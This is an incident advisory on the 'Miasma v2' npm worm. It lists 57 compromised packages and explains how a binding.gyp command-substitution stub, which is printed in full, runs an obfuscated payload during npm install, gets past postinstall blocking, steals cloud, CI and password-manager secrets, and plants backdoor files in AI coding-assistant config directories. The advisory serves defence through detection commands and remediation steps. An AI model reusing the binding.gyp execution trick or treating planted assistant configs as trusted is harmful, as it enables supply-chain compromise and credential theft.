# Miasma v2 — Self-Spreading npm Worm Uses binding.gyp Execution Bypass to Compromise 57 Packages

**Date:** June 2026
**Ecosystem:** npm
**Severity:** Critical
**Type:** Self-Propagating Worm / Credential Stealer / AI Assistant Poisoning / Provenance Forgery
**Sources:**
- [Semgrep — Miasma v2: Self-Spreading npm Worm Now Uses Malicious binding.gyp file and Compromises 57 Packages](https://semgrep.dev/blog/2026/miasma-v2-self-spreading-npm-worm-now-uses-malicious-bindinggyp-file-and-compromises-57-packages)

---

## Summary

A self-spreading npm worm dubbed Miasma v2 compromised 57 npm packages across 286+ malicious versions in early June 2026, arriving days after the initial Miasma/RedHat wave documented earlier the same week. Miasma v2 introduced a significant technical evolution: rather than using the standard `preinstall`/`postinstall` lifecycle scripts in `package.json` — which npm v12 and security tooling increasingly flag — the malware ships a ~157-byte `binding.gyp` file containing a command-substitution action (`"<!(node index.js > /dev/null 2>&1 && echo stub.c)"`). This triggers arbitrary code execution during `npm install` without declaring a lifecycle script at all, bypassing lifecycle-script blocking controls.

The payload is highly obfuscated and substantially inherits the Mini Shai-Hulud/TeamPCP architecture: it harvests AWS, GCP, and Azure credentials; extracts GitHub Actions secrets including direct extraction from runner process memory via `/proc/*/mem`; drains 1Password, gopass, and `pass` credential stores; injects persistent backdoors into AI coding-assistant configuration files (Claude, Cursor, VS Code, Gemini); and propagates automatically by forging npm provenance attestations so reinfected packages appear to come from a legitimate CI source. Stolen credentials are exfiltrated to attacker-controlled GitHub repositories.

---

## Compromised Artifacts

| Package | Malicious Versions |
|---------|------------------|
| `@evolvconsulting/evolv-coder-lite` | 1.2.0 |
| `@jagreehal/workflow` | 1.16.1 |
| `@vapi-ai/server-sdk` | 0.11.1, 0.11.2, 1.2.1, 1.2.2 |
| `ai-sdk-ollama` | 0.13.1, 1.1.1, 2.2.1, 3.8.5 |
| `autotel` | 2.26.4, 3.4.3 |
| `autotel-adapters` | 0.3.5 |
| `autotel-audit` | 0.1.15 |
| `autotel-aws` | 0.13.10 |
| `autotel-backends` | 2.12.26 |
| `autotel-cli` | 0.8.14 |
| `autotel-cloudflare` | 2.18.16 |
| `autotel-devtools` | 0.1.1, 1.0.4, 2.1.1, 3.0.2, 4.0.1, 5.1.1, 6.1.2 |
| `autotel-drizzle` | 0.0.27 |
| `autotel-edge` | 3.16.13 |
| `autotel-eventcatalog` | 1.0.1, 2.0.1, 3.0.1, 4.0.2, 5.0.1 |
| `autotel-hono` | 0.4.26 |
| `autotel-mcp` | 0.1.14, 2.0.1–28.0.3 (27 versions) |
| `autotel-mcp-instrumentation` | 29.0.2–34.0.1 (6 versions) |
| `autotel-mongoose` | 0.0.3–6.0.1 (6 versions) |
| `autotel-pact` | 0.2.2, 1.0.3 |
| `autotel-playwright` | 0.4.32 |
| `autotel-plugins` | 0.19.26 |
| `autotel-sentry` | 0.5.13 |
| `autotel-subscribers` | 4.1.1–31.1.4 (31 versions) |
| `autotel-tanstack` | 1.13.27 |
| `autotel-terminal` | 2.1.1–23.0.3 (23 versions) |
| `autotel-vitest` | 0.4.26 |
| `autotel-web` | 1.12.2 |
| `awaitly` | 1.33.3 |
| `awaitly-analyze` | 0.24.2, 1.0.1–8.0.1 (8 versions) |
| `awaitly-libsql` | 0.1.1–22.0.1 (22 versions) |
| `awaitly-mongo` | 0.1.1–23.0.1 (24 versions) |
| `awaitly-postgres` | 0.1.1–22.0.1 (23 versions) |
| `awaitly-visualizer` | 1.0.1–22.0.2 (22 versions) |
| `effect-analyzer` | 0.3.1 |
| `eslint-plugin-awaitly` | 0.17.1, 1.0.1 |
| `eslint-plugin-executable-stories-jest` | 1.2.1, 2.1.8 |
| `eslint-plugin-executable-stories-playwright` | 1.2.1, 2.1.8 |
| `eslint-plugin-executable-stories-vitest` | 1.2.1, 2.1.8 |
| `executable-stories-cypress` | 3.1.1–8.3.2 (6 versions) |
| `executable-stories-demo` | 0.1.11 |
| `executable-stories-formatters` | 0.11.2 |
| `executable-stories-init` | 0.1.2 |
| `executable-stories-jest` | 3.1.1–8.3.2 (6 versions) |
| `executable-stories-mcp` | 0.3.3 |
| `executable-stories-playwright` | 3.1.1–8.4.3 (6 versions) |
| `executable-stories-react` | 0.1.7 |
| `executable-stories-vitest` | 2.0.1–8.3.3 (7 versions) |
| `http-uploader-dev` | 1.0.7 |
| `mountly` | 0.2.2 |
| `mountly-tailwind` | 0.1.3 |
| `node-env-resolver` | 6.5.1 |
| `node-env-resolver-aws` | 9.1.2, 10.0.1, 11.0.1, 12.0.1 |
| `node-env-resolver-dotenvx` | 1.0.1, 2.0.1 |
| `node-env-resolver-nextjs` | 7.4.2 |
| `node-env-resolver-vite` | 2.4.2 |
| `wrangler-deploy` | 1.5.5 |

---

## How It Worked

### Entry Point: binding.gyp Execution Bypass

Instead of a `preinstall`/`postinstall` lifecycle script in `package.json` — which modern tooling and npm v12 can block — the malware ships a 157-byte `binding.gyp` file with a command-substitution action:

```json
{
  "targets": [{
    "target_name": "stub",
    "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]
  }]
}
```

When npm processes a package with a `binding.gyp` file, it invokes `node-gyp` to build a native addon. The `<!()` syntax is a shell command substitution: it executes `node index.js` as part of resolving the source file list. This runs the malicious payload without any lifecycle script being declared, bypassing controls that block `preinstall`/`postinstall` hooks.

### Payload: Credential Harvesting

The root-level `index.js` (4+ MB, heavily obfuscated) performs:
- **Cloud credential extraction**: AWS (`~/.aws/credentials`, environment variables), GCP application default credentials, Azure service principal files
- **GitHub Actions secrets**: Direct extraction from runner process memory via `/proc/*/mem` reads — extracts secrets that are masked in logs
- **Password manager drain**: 1Password, gopass, and `pass` credential stores
- **AI assistant persistence**: Injects backdoor files into `.claude/setup.mjs`, `.claude/settings.json`, `.cursor/rules/setup.mdc`, `.gemini/settings.json`, `.vscode/tasks.json`, `.vscode/setup.mjs`, `.github/setup.js` — poisoning AI-generated code suggestions

### Propagation: Forged Provenance Attestations

Like Mini Shai-Hulud, Miasma v2 propagates automatically. It uses stolen npm publish credentials to republish infected versions of packages the compromised account can publish. Critically, it forges npm provenance attestations using stolen OIDC tokens, making reinfected packages appear to have been built and signed by legitimate CI pipelines.

### Exfiltration

Stolen credentials are written to attacker-controlled GitHub repositories using the pattern:
`{repo}/contents/results/results-{timestamp}.json`

The commit beacon keyword `thebeautifulmarchoftime` is embedded in these exfil commits and can be used to identify C2 repositories via GitHub's commit search.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| Jun 1, 2026 | Miasma v1 / RedHat npm attack (first Miasma wave) |
| Jun 4, 2026 | Miasma v2 packages begin appearing on npm with `binding.gyp` execution mechanism |
| Jun 4, 2026 | Semgrep detects and publishes analysis |
| Jun 4–5, 2026 | npm takes down 57 packages / 286+ malicious versions |

---

## Detection

```bash
# Check for binding.gyp in node_modules — legitimate packages rarely ship these
find node_modules -name "binding.gyp" -exec grep -l 'node index.js' {} \;

# Check for 4MB+ obfuscated index.js files
find node_modules -name "index.js" -size +3M

# Search for the beacon keyword in GitHub commit history (on CI runners)
git log --all --oneline | grep -i "thebeautifulmarchoftime"

# Check for AI assistant backdoor files
ls -la .claude/setup.mjs .claude/settings.json 2>/dev/null
ls -la .cursor/rules/setup.mdc 2>/dev/null
ls -la .gemini/settings.json 2>/dev/null
ls -la .vscode/setup.mjs .vscode/tasks.json 2>/dev/null
ls -la .github/setup.js 2>/dev/null

# Check for Bun runtime downloads (indicator of TeamPCP-style worm)
find /tmp -name "bun-*.zip" -newer /etc/hostname 2>/dev/null
ls /tmp/b-* 2>/dev/null

# Check npm token validity (invalidate tokens if runner was affected)
npm whoami --registry https://registry.npmjs.org

# Search for specific affected packages in lock file
grep -E "autotel|awaitly|executable-stories|node-env-resolver|mountly|wrangler-deploy|ai-sdk-ollama|vapi-ai" package-lock.json
```

---

## Remediation

1. Remove all affected package versions listed above and run `npm install` fresh after npm has removed the malicious versions
2. Check for and delete any AI assistant backdoor files: `.claude/setup.mjs`, `.cursor/rules/setup.mdc`, `.gemini/settings.json`, `.vscode/setup.mjs`, `.github/setup.js`
3. Rotate all credentials on affected machines and CI runners: AWS/GCP/Azure keys, GitHub tokens, npm tokens, 1Password/gopass master passwords
4. Trigger new Semgrep scans and check the advisories page for installed affected versions
5. Audit any npm packages published from affected machines/CI runners — check if the worm republished malicious versions
6. Revoke and reissue any OIDC publish tokens used by affected CI pipelines
7. Search GitHub for exfil repositories using the beacon keyword: `thebeautifulmarchoftime` in GitHub's code/commit search

---

## Lessons Learned

- **Blocking `postinstall` is not enough**: The `binding.gyp` command-substitution technique provides an alternative code execution path during `npm install` that bypasses lifecycle-script restrictions. Even with npm v12's default blocking of postinstall scripts, this attack succeeds.
- **Memory scraping defeats secret masking**: Reading secrets directly from `/proc/*/mem` of running GitHub Actions processes extracts values that would never appear in logs, even with masking enabled.
- **Provenance attestations can be forged with stolen OIDC tokens**: Signed provenance is only trustworthy if the OIDC token used to generate it was not itself stolen.
- **AI assistant config files are a new persistence mechanism**: Backdooring `.claude/settings.json` and equivalents means the malware can influence AI code suggestions long after the initial infection, potentially injecting vulnerabilities into future commits.

---

## Related Incidents

- [2026-06-miasma-redhat-npm.md](./2026-06-miasma-redhat-npm.md) — Miasma v1: RedHat npm packages compromised in the same week
- [2026-05-antv-npm-shai-hulud.md](./2026-05-antv-npm-shai-hulud.md) — Mini Shai-Hulud Wave 4: parent worm architecture this attack inherits
- [2026-05-mini-shai-hulud-tanstack-npm.md](./2026-05-mini-shai-hulud-tanstack-npm.md) — Mini Shai-Hulud Wave 3: same TeamPCP C2 infrastructure and propagation mechanism
